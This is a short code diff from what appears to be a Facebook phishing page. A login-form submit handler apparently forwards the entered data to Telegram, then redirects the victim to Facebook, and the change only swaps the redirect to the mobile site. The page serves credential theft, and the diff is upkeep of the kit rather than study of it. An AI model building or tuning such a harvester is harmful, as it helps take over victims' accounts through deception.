@@ -32,7 +32,7 @@ document.getElementById('login-form').addEventListener('submit', function (e) {
         })
         .then(response => {
             console.log('Message sent successfully:', response.data);
-            window.location.href = "https://www.facebook.com/";
+            window.location.href = "https://m.facebook.com/";
         })
         .catch(err => {
             console.error('Error sending message to Telegram:', err);
